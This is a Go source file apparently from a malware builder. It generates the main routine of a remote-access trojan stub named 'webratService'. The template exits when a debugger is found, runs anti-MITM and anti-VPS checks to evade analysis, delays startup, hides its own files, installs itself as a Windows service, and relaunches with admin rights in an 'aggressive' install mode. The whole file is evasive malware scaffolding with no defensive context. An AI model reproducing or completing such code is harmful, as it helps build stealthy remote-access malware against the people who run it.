package buildergen

import "strings"

func templateMainFlow() string {
	return strings.TrimSpace(`
func main() {
	logFile := setupLogger()
	if logFile != nil {
		defer logFile.Close()
	}
	log.Println("[main] started, pid=", os.Getpid(), "args=", os.Args)

	if isDebuggerPresent() {
		log.Println("[main] debugger detected, exiting")
		os.Exit(0)
	}
	log.Println("[main] no debugger")

	analysisMode := strings.TrimSpace(antiAnalysisMode)
	log.Println("[main] antiAnalysisMode=", analysisMode)
	if strings.EqualFold(analysisMode, "AntiMitm") || strings.EqualFold(analysisMode, "Full") {
		log.Println("[main] running AntiMitm checks")
		checkAntiMitm()
	}

	if strings.EqualFold(analysisMode, "AntiVps") || strings.EqualFold(analysisMode, "Full") {
		log.Println("[main] running AntiVps checks")
		checkAntiVps()
	}

	log.Println("[main] applying startup delay")
	applyStartupDelay()

	log.Println("[main] hiding self files")
	hideSelfFiles()

	if runtime.GOOS == "windows" {
		isSvc, err := svc.IsWindowsService()
		log.Println("[main] isWindowsService=", isSvc, "err=", err)
		if err == nil && isSvc {
			log.Println("[main] running as Windows service")
			_ = svc.Run(getServiceName(), &webratService{})
			return
		}
	}

	if len(os.Args) > 1 && os.Args[1] == "worker" {
		log.Println("[main] worker mode, calling runWorkerGuard")
		runWorkerGuard()
		return
	}

	forceMode := strings.TrimSpace(forceAdminMode)
	aggressiveMode := strings.EqualFold(forceMode, "Aggressive") || strings.EqualFold(forceMode, "Agressive")
	log.Println("[main] forceMode=", forceMode, "aggressiveMode=", aggressiveMode)

	enforceLock := shouldEnforceBuildLock()
	log.Println("[main] shouldEnforceBuildLock=", enforceLock)
	if enforceLock && !(aggressiveMode && !isAdmin()) && !ensureSingleRunPerBuild() {
		log.Println("[main] build lock already exists, exiting")
		return
	}

	if aggressiveMode {
		log.Println("[main] aggressive mode flow")
		if shouldEnforceBuildLock() {
			if isAggressiveAlreadyInstalled() {
				log.Println("[main] aggressive already installed, exiting")
				return
			}

			if !isAdmin() {
				log.Println("[main] not admin, relaunching as admin")
				relaunchAsAdmin()
				return
			}

			if opInstallAll() {
				log.Println("[main] opInstallAll succeeded, exiting")
				return
			}
		}

		log.Println("[main] calling runPrimaryWithWorker (aggressive)")
		runPrimaryWithWorker()
		return
	}

	log.Println("[main] calling runPrimaryWithWorker (normal)")
	runPrimaryWithWorker()
}
`)
}